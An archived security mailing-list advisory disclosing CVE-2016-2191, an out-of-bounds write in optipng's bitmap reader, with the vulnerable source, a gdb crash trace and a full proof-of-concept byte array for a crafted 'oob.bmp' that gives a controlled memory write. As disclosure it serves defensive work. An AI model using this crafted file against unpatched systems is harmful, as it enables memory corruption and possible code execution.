X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6667" "Monday" "4" "April" "2016" "23:33:09" "+0700" "Hans Jerry Illikainen" "hji@dyntopia.com" "<m1oa9pfi62.darpa@darpa.mil>" "176" "[oss-security] CVE-2016-2191: optipng: invalid write" "^Date:" nil nil "4" "2016040416:33:09" "[oss-security] CVE-2016-2191: optipng: invalid write" (number mark "U       hji@dyntopia Apr  4  176/6667  " thread-indent "\"[oss-security] CVE-2016-2191: optipng: invalid write\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22008 invoked by uid 550); 4 Apr 2016 16:31:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 21990 invoked from network); 4 Apr 2016 16:31:30 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dyntopia-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:subject:date:message-id:mime-version;
        bh=1yFHZKwKIaqfmzbN4GWxRA/btefSs0K3sI66Qh3Mno4=;
        b=dO6IcjDMaGl/kqDF6H8hezIxo3Ip8B3ZOOBquwV1KWyFlz8YH4IlxZma3jXwe2v/0z
         mRl6oLo9G8BUjX2PWMsbgM+o8pVAwwA9IGyCrLasbkjy1RYbz1UpLnDLhFi2/Ye3AsOB
         0s2HXLVQsqJ5qNErnZeaepfTIz+c42fMnCsdFw6FyPsHA8dk4MYuhw3qwxvSAOyMm1ff
         um1yVVgqaDYSMMhuj4XqdPakOXFPmZ9DG35Es6rP13uGYdTMHYIz1CWYE7pQx0uHXgxc
         ttFdggywmYqj5N01z0qxbggBjhyD2Q3qDbycG1ig9sAmGKG/7Wyyr7PBh/sBY0BY/ckT
         SjSw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:to:subject:date:message-id:mime-version;
        bh=1yFHZKwKIaqfmzbN4GWxRA/btefSs0K3sI66Qh3Mno4=;
        b=kAcHplCxw8f8Zf6EOkYJtx/u1x8ypQAlUQdHH4Fw7xYNQpgdDTcXvoVIEHJMogPyb5
         hpkF8QuVaISZD/19pMSNQ6JNfiz/nu9H1oVQWlfIu2ejpRIs8e3yBrNcN5JgSrEITMG7
         s74VQ+cQiG4huV6wVgZO+pR5p7UV9rt7ssiKzObSioty3r8ao/I1Lgjj5RzndJ0ubocx
         OAA8lLnk+utxXkdhhymfzsDpo7hDklI7dQ6LNf3ipmjGpz7dmivvtEmUH3ELE1d9EGSA
         Hq8CTakfYJFzfJXewPAInd95M2Ch/jgoY9JoWxTxOLqNXpkxBaZlsnG+CFPjwB0u1L0n
         qAAw==
X-Gm-Message-State: AD7BkJIduWNv9ZuYY/2abwHN+7fhyDAY2Jl2rXmgi6PC01RD9wbX0AhBxIdxypTzrpybEw==
X-Received: by 10.28.187.136 with SMTP id l130mr2601437wmf.23.1459787479369;
        Mon, 04 Apr 2016 09:31:19 -0700 (PDT)
Message-ID: <m1oa9pfi62.darpa@darpa.mil>
MIME-Version: 1.0
Content-Type: text/plain
Date: Mon, 04 Apr 2016 23:33:09 +0700
From: Hans Jerry Illikainen <hji@dyntopia.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2016-2191: optipng: invalid write
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, oss-security@lists.openwall.com

An invalid write may occur in optipng before version 0.7.6 while
processing bitmap images due to `crt_row' being (inc|dec)remented
without any boundary checking when encountering delta escapes.

optipng-0.7.5/src/pngxtern/pngxrbmp.c:
,----
| 210 static size_t
| 211 bmp_read_rows(png_bytepp begin_row, png_bytepp end_row, size_t row_size,
| 212               unsigned int compression, FILE *stream)
| 213 {
| ...
| 272       crt_row = begin_row;
| 273       for ( ; ; )
| 274       {
| 275          ch = getc(stream); b1 = (unsigned int)ch;
| 276          ch = getc(stream); b2 = (unsigned int)ch;
| 277          if (ch == EOF)
| 278             break;
| 279          if (b1 == 0)  /* escape */
| 280          {
| ...
| 307             else if (b2 == 2)  /* delta */
| 308             {
| 309                ch = getc(stream); b1 = (unsigned int)ch;  /* horiz. offset */
| 310                ch = getc(stream); b2 = (unsigned int)ch;  /* vert. offset */
| ...
| 314                if (b2 > (size_t)((end_row - crt_row) * inc))
| 315                   b2 = (unsigned int)((end_row - crt_row) * inc);
| 316                for ( ; b2 > 0; --b2)
| 317                {
| ...
| 319                   crt_row += inc;
| ...
| 322                }
| ...
| 324             }
| 325             else  /* b2 >= 3 bytes in absolute mode */
| 326             {
| 327                len = (b2 <= endn - crtn) ? b2 : (unsigned int)(endn - crtn);
| 328                if (bmp_fread_fn(*crt_row, crtn, len, stream) != len)
| 329                   break;
| 330                crtn += len;
| 331             }
| 332          }
| ...
| 352 }
`----

After `crt_row' has moved OOB, an invalid write may be triggered with
`bmp_fread_fn()' in absolute mode:

,----
| $ gdb --args optipng oob.bmp
| (gdb) r
|  ** Processing: oob.bmp
| 
| Program received signal SIGSEGV, Segmentation fault.
| __memcpy_sse2 () at ../sysdeps/x86_64/multiarch/../memcpy.S:96
| 96  ../sysdeps/x86_64/multiarch/../memcpy.S: No such file or directory.
| 
| (gdb) bt
| #0  __memcpy_sse2 () at ../sysdeps/x86_64/multiarch/../memcpy.S:96
| #1  0x00007ffff7a89003 in __GI__IO_file_xsgetn (fp=0x64a010, data=<optimized out>, n=4) at fileops.c:1371
| #2  0x00007ffff7a7e5f0 in __GI__IO_fread (buf=<optimized out>, size=1, count=4, fp=0x64a010) at iofread.c:42
| #3  0x000000000040b632 in bmp_rle4_fread (ptr=0x4141 <error: Cannot access memory at address 0x4141>, offset=0, len=8, stream=0x64a010) at pngxrbmp.c:170
| #4  0x000000000040baf6 in bmp_read_rows (begin_row=0x64e668, end_row=0x64a538, row_size=4, compression=2, stream=0x64a010) at pngxrbmp.c:328
| #5  0x000000000040cb0e in pngx_read_bmp (png_ptr=0x64a240, info_ptr=0x64a4b0, stream=0x64a010) at pngxrbmp.c:724
| #6  0x000000000040b352 in pngx_read_image (png_ptr=0x64a240, info_ptr=0x64a4b0, fmt_name_ptr=0x7fffffffbf10, fmt_long_name_ptr=0x0) at pngxread.c:130
| #7  0x00000000004043cc in opng_read_file (infile=0x64a010) at optim.c:939
| #8  0x000000000040586a in opng_optimize_impl (infile_name=0x7fffffffe86f "oob.bmp") at optim.c:1503
| #9  0x0000000000406749 in opng_optimize (infile_name=0x7fffffffe86f "oob.bmp") at optim.c:1853
| #10 0x0000000000402bf0 in process_files (argc=2, argv=0x7fffffffe638) at optipng.c:941
| #11 0x0000000000402cb5 in main (argc=2, argv=0x7fffffffe638) at optipng.c:975
| 
| (gdb) x/i $rip
| => 0x7ffff7aa3427 <__memcpy_sse2+55 at ../sysdeps/x86_64/multiarch/../memcpy.S:96>: mov    %ecx,(%rdi)
| (gdb) p/x $ecx
| $1 = 0x11223344
| (gdb) p/x $rdi
| $2 = 0x4141
| (gdb)
`----


oob.bmp
=======

,----
| unsigned char bmp[] = {
|     /* bmp header */
|     0x42, 0x4d,             /* BM */
|     0x00, 0x00, 0x00, 0x00, /* bmp size */
|     0x00, 0x00,             /* reserved */
|     0x00, 0x00,             /* reserved */
|     0x7a, 0x00, 0x00, 0x00, /* offset */
| 
|     /* dib header */
|     0x6c, 0x00, 0x00, 0x00, /* header_size (BITMAPV4HEADER) */
|     0x01, 0x00, 0x00, 0x00, /* width */
|     0x26, 0x08, 0x00, 0x00, /* height */
|     0x01, 0x00,             /* color planes */
|     0x04, 0x00,             /* bits per pixel */
|     0x02, 0x00, 0x00, 0x00, /* compression (RLE4) */
|     0x00, 0x00, 0x00, 0x00, /* size of bitmap */
|     0x00, 0x00, 0x00, 0x00, /* horizontal resolution */
|     0x00, 0x00, 0x00, 0x00, /* vertical resolution */
|     0x01, 0x00, 0x00, 0x00, /* number of colors */
|     0x00, 0x00, 0x00, 0x00, /* number of important colors */
|     0x00, 0x00, 0x00, 0x00, /* red mask */
|     0x00, 0x00, 0x00, 0x00, /* green mask */
|     0x00, 0x00, 0x00, 0x00, /* blue mask */
|     0x00, 0x00, 0x00, 0x00, /* alpha mask */
|     0x00, 0x00, 0x00, 0x00, /* color space type */
|     0x00, 0x00, 0x00, 0x00, /* x coordinate of red endpoint */
|     0x00, 0x00, 0x00, 0x00, /* y coordinate of red endpoint */
|     0x00, 0x00, 0x00, 0x00, /* z coordinate of red endpoint */
|     0x00, 0x00, 0x00, 0x00, /* x coordinate of green endpoint */
|     0x00, 0x00, 0x00, 0x00, /* y coordinate of green endpoint */
|     0x00, 0x00, 0x00, 0x00, /* z coordinate of green endpoint */
|     0x00, 0x00, 0x00, 0x00, /* x coordinate of blue endpoint */
|     0x00, 0x00, 0x00, 0x00, /* y coordinate of blue endpoint */
|     0x00, 0x00, 0x00, 0x00, /* z coordinate of blue endpoint */
|     0x00, 0x00, 0x00, 0x00, /* red gamma */
|     0x00, 0x00, 0x00, 0x00, /* green gamma */
|     0x00, 0x00, 0x00, 0x00, /* blue gamma */
| 
|     /*
|      * delta escape (0x00, 0x02), b1, b2
|      *
|      * The number of delta escapes required for crt_row to be moved
|      * beyond its allocated chunk depends on the image height.
|      *
|      * b1 is relevant in the last escape if the value at *crt_row is a
|      * non-writable address due to:
|      *
|      * dcrtn = (b1 < endn - crtn) ? (crtn + b1) : endn;
|      * [...]
|      * for ( ; b2 > 0; --b2)
|      * {
|      *     [...]
|      *     crt_row += inc;
|      *     crtn = 0
|      *     [...]
|      * }
|      * bmp_memset_fn(*crt_row, crtn, 0, dcrtn - crtn);
|      *
|      * For RLE4-encoded data, bmp_rle4_memset() bails if dcrtn - crtn == 0
|      */
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x11, 0xff,
|     0x00, 0x02, 0x00, 0xff,
| 
|     /*
|      * absolute mode (0x00, 0x03..0xff) followed by the value that's
|      * bmp_fread_fn() to *crt_row
|      */
|     0x00, 0xff, 0x44, 0x33, 0x22, 0x11
| };
`----


Solution
========

This issue has been assigned CVE-2016-2191 and is fixed in optipng
0.7.6.


-- 
Hans Jerry Illikainen
